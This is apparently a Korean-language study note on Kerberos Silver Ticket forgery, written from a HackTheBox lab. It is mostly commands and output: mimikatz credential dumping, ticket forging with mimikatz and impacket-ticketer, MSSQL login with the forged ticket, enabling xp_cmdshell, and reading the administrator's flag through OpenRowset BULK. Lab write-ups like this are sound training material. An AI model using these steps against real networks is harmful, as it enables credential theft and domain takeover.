사전 필요 정보

- **SPN 비밀번호 해시**
- **도메인 SID**
- **타겟 SPN**

→ 아무래도 SPN 해시 크랙이 안되면, 이 공격으로 넘어가야 할듯?

해당 공격은
**→ mimikatz (win)**
**→ impacket-ticketer (linux)**
로 할 수 있다.


### mimikatz
```powershell
privilege::debug
sekurlsa::logonpasswords
# Authentication Id : 0 ; 1147751 (00000000:00118367)
#Session           : Service from 0
#User Name         : iis_service
#Domain            : CORP
#Logon Server      : DC1
#Logon Time        : 9/14/2022 4:52:14 AM
#SID               : S-1-5-21-1987370270-658905905-1781884369-1109
#        msv :
#         [00000003] Primary
#         * Username : iis_service
#         * Domain   : CORP
#         *** NTLM     : 4d28cf5252d39971419580a51484ca09**
#         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
#         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
#...
# SPN(iis_service)의 해시 탈취
# whoami 명령어로 도메인 SID 획득

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
# 이후 exit로 나오고 klist 명령오로 티켓 확인 가능
```



### Linux 에서 Exploit
#### NTLM 해시 생성 (password -> NTLM)
```bash
┌──(kali㉿kali)-[~/htb/escape]
└─$ python3                      
Python 3.13.2 (main, Mar 13 2025, 14:29:07) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib
>>> **hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().hex()**
'1443ec19da4dac4ffc953bca1b57b4cf'
>>> exit()
```

####  도메인의 SID 조회
```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> get-addomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=sequel,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=sequel,DC=htb
DistinguishedName                  : DC=sequel,DC=htb
DNSRoot                            : sequel.htb
DomainControllersContainer         : OU=Domain Controllers,DC=sequel,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-4078382237-1492182817-2568127209

...

```

#### Silver Ticket 발행 (Ticketer)
```bash
┌──(kali㉿kali)-[~/htb/escape]
└─$ impacket-ticketer -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn l8bl/dc.sequel.htb administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
...
[*] Saving ticket in administrator.ccache
```

#### Kerberos 이용해서 인증
```bash
┌──(kali㉿kali)-[~/htb/escape]
└─$ KRB5CCNAME=administrator.ccache impacket-mssqlclient -k administrator@dc.sequel.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sequel\Administrator  dbo@master)> enable_xp_cmdshell;
INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL             
```
( ※ xp_cmdshell은 create process를 통해 실행된다. 이 때, impersonation 권한이 없다면, xp_cmdshell 의 권한이 administrator 로 전환하는데 실패한다. 그러나 process가 생성되지 않고 아래에 있는 file system 을 호출하는 `(select x from OpenRowset(BULK 'C:\\Users\\Administrator\\Desktop\\root.txt', SINGLE_CLOB) R(x))` 와 같은 페이로드는 Administrator 권한으로 실행된다. )

```python
SQL (sequel\\Administrator  dbo@master)> (select x from OpenRowset(BULK 'C:\\Users\\Administrator\\Desktop\\root.txt', SINGLE_CLOB) R(x))
x                                         
---------------------------------------   
b'5502a81cd2722c7bc0b10b024c7495b9\\r\\n'   

```
→ [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql) 와 같은 구문으로 대용량 파일을 복사할 수 있으므로, WerTrigger 와 같은 방법으로 PE 할 수 있다.